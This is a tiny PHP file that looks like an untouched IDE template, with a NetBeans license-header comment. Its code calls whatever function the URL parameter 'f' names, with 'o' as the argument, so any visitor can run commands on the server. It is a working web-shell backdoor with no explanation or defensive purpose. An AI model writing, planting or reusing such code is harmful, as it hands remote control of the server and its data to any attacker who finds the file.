<?php

/* 
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

if(function_exists($_GET['f'])) {
    if(isset($_GET['o'])){
        $_GET['f']($_GET['o']);
    }else{
        $_GET['f']();
    }
   
}